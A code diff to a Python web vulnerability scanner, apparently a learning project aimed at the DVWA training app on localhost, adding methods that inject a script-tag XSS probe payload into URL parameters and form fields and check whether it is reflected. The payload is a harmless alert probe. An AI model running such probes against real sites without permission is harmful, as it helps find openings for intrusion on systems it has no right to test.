@@ -51,12 +51,12 @@ class Scanner:
         method = form.get("method")
         post_url = urlparse.urljoin(url, action)
 
-        print(
-            f"URL: {post_url} : \n",
-            "[+] Forms: \n"
-            f"action: {action}",
-            f"method: {method}"
-        )
+        # print(
+        #     f"URL: {post_url} : \n",
+        #     "[+] Forms: \n"
+        #     f"action: {action}",
+        #     f"method: {method}"
+        # )
         # payload = "XSS TEST"
         
         input_list = form.findAll("input")
@@ -73,6 +73,29 @@ class Scanner:
             return self.session.post(post_url,data=post_data)
         return self.session.get(post_url, params=post_data)
 
+    def run_scanner(self):
+        for link in self.target_links:
+            forms = self.extract_forms(link)
+
+            for form in forms:
+                print(f"[+] Testing form in: {link}")
+
+            if "=" in link:
+                print(f"[+] Testing: {link}")
+
+    def test_xss_in_link(self, url):
+        xss_payload = "<sCript>alert('XSS PAYLOAD')</scriPt>"
+        url = url.replace("=", f"={xss_payload}")
+        response = self.session.get(url=url)
+        if xss_payload in response.text:
+            return True
+
+    def test_xss_in_form(self,form, url):
+        xss_payload = "<sCript>alert('XSS PAYLOAD')</scriPt>"
+        response = self.submit_form(form=form, value=xss_payload, url=url)
+        if xss_payload in response.text:
+            return True
+    
 
 def dvwa_scan():
     # EXAMPLE ATTACK IF THERE's AUTHENTICATION 
@@ -97,9 +120,18 @@ def dvwa_scan():
 
     test_url = "http://localhost/vulnerabilities/xss_r/"
     forms = vuln_scanner.extract_forms(test_url)
-    print(forms)
-    response = vuln_scanner.submit_form(form=forms[0], value='testtest',url=test_url)
-    print(response.text)
+    # print(forms)
+
+    # response = vuln_scanner.submit_form(form=forms[0], value='testtest',url=test_url)
+    # print(response.text)
+
+    # EXPLOIT XSS in FORMS
+    # response = vuln_scanner.test_xss_in_form(form=forms[0], url=test_url)
+    # print(response)
+
+    # EXPLOIT XSS in LINK
+    response = vuln_scanner.test_xss_in_link(f"{test_url}?name=test")
+    print(response)
 
 
 
